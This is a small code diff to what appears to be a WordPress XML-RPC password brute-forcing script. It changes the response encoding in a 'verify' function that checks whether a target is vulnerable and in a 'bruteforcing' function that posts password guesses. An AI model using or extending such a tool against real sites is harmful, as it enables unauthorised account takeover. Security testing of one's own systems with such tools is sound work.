@@ -50,7 +50,7 @@ def verify(url): ## verify if target is vulnerable or not
 
     headers = {"Content-Type": "application/xml"}
     r = requests.post(url, data=xmlrpc_methods, headers=headers)
-    r.encoding = 'UTF-8'
+    r.encoding = 'UTF-8-sig'
     if "wp.getUsersBlogs" in r.text:
         print(colored('[>]', 'green'), colored('Target is vulnerable.', 'white'))
     else:
@@ -86,7 +86,7 @@ def bruteforcing(url, user, passwords):
   data = prefix + payload + suffix 
   headers = {"Content-Type": "application/xml"}
   r = requests.post(url, data=data, headers=headers)
-  r.encoding = 'UTF-8'
+  r.encoding = 'UTF-8-sig'
   #print(r.text)
   return r.text
 
